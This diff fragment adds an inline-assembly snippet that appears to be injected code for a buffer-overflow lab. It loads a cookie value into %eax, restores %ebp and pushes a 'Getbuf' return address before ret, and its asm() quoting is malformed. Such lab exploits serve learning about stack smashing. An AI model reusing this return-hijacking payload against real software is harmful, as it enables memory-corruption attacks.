@@ -1,0 +1,6 @@
+asm("movl  $0x160671a6 , %eax",
+movl  $0x44434241 , %ebp
+pushl $0x08048d94         #Getbuf return address
+ret
+
+   );
